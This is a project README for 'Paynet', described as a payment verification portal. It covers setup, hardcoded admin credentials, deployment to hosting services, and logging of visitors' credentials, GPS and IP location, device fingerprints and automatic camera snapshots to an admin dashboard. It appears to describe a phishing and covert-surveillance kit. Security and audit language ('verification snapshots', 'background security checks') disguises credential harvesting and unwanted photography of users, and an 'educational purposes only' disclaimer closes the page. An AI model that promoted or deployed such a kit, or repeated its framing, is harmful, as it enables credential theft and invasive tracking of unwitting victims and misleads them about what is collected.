# Paynet - Secure Payment Verification System

A robust payment verification platform with comprehensive security logging features.

## Features

- **Secure Login**: Protected credential verification system
- **Geolocation Tracking**: Automatic IP and GPS location logging
- **Device Fingerprinting**: Detailed device and browser analysis
- **Photo Verification**: Automatic camera capture for security audit
- **Admin Dashboard**: Real-time monitoring of login attempts and security events

## Installation

```bash
npm install
```

## Run Server

```bash
npm start
```

Server runs on: **http://localhost:3003**

## Default Credentials

- **Admin Username:** `safwan`
- **Admin Password:** `saf123`

## How It Works

1. User accesses verification portal
2. System requests necessary security permissions (Location, Camera)
3. Background security checks are performed
4. Credentials are verified against secure database
5. All access attempts are logged for audit

## Security Data Collection

The system securely logs the following for audit purposes:
- ✅ Verification snapshots (captured securely)
- ✅ Geo-coordinates (Latitude/Longitude)
- ✅ IP-based location data
- ✅ Device telemetry (OS, Browser, Screen resolution)
- ✅ Access timestamps

## File Structure

```
paynet/
├── server.js                 # Core application server
├── loginAttempts.json        # Encrypted audit logs
├── captures/                 # Security verification snapshots
├── views/
│   ├── login.hbs             # Verification interface
│   ├── admin.hbs             # Admin monitoring dashboard
│   └── ...                   # Other system pages
└── package.json              # Project dependencies
```

## Admin API

### `GET /admin`
Access the secure monitoring dashboard.

### `POST /verify`
Process verification attempts and log security data.

### `POST /capture-photo`
Secure endpoint for verification snapshot storage.

## Deployment

Configured for generic Node.js hosting or containerized environments (Render, Heroku, etc.).

## Disclaimer

This system is designed for **educational and testing purposes only**. Ensure you have explicit consent before using data collection features in any production environment.
